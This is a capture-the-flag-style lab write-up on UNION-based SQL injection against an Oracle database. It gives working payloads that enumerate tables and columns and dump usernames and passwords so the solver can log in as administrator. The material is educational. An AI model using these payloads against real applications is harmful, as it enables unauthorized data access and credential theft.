# SQL injection attack, listing the database contents on Oracle

### Lab description
This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. 

**Goal:** log in as the **administrator** user. 

---

## Steps

Select category and forward request to repeater.
Determine text field. On Oracle database you need to use word FROM with SELECT, default table is 'dual'. 
```SQL
'+UNION+SELECT+NULL,'qwerty'+FROM+dual--   200 OK
```

We can determine DB version using this payload:

```SQL
'+UNION+SELECT+NULL,banner+FROM+v$version--
```

For extract list of tables names in DB use this payload:

```SQL
'+UNION+SELECT+NULL,TABLE_NAME+FROM+all_tables--   200 OK
```

Use search to find USERS_XYJXLY and use payload for retrieve details of the columns:

```SQL
'+UNION+SELECT+NULL,COLUMN_NAME+FROM+all_tab_columns+WHERE+TABLE_NAME='USERS_XYJXLY'--   200 OK
```

We find **USERNAME_MOCEJR** and **PASSWORD_ZGDUEN**

Finally:

```SQL
'+UNION+SELECT+USERNAME_MOCEJR,PASSWORD_ZGDUEN+FROM+USERS_XYJXLY--   200 OK
```

And we retrieve users log in credentials. Then log in as **administrator**.

> ### **Congratulations, you solved the lab!**